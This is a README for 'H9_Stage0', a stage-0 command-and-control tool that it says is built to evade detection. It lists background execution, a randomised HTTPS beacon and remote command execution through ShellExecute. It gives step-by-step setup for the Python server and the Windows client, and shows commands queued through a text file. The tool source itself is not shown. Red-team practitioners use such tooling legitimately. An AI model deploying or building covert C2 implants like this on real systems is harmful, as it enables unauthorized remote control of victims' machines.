![logo](https://github.com/ZERODETECTION/H9_Stage0/blob/main/logo_sm.png)


**H9_Stage0**

A minimalist stage-0 C2 designed to fly under the radar. It uses HTTPS and executes commands on the client-side.

Features:
- HTTPS used
- Random connection timer
- Runs in the background
- `ShellExecute` for command execution


## Server
Clone the repository
```bash
git clone https://github.com/ZERODETECTION/H9_Stage0.git
```
Generate SSL certificates (self-signed)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

Start the Stage-0 server
```bash
python3 stage0_svr.py
```

To send commands, write directly into `commands.txt`:

```bash
echo "cmd /c calc" > commands.txt
```

## Client
To compile the client open a "x64 Native Tools Command Prompt for VS 2019" and run:

```bash
compile.bat
```


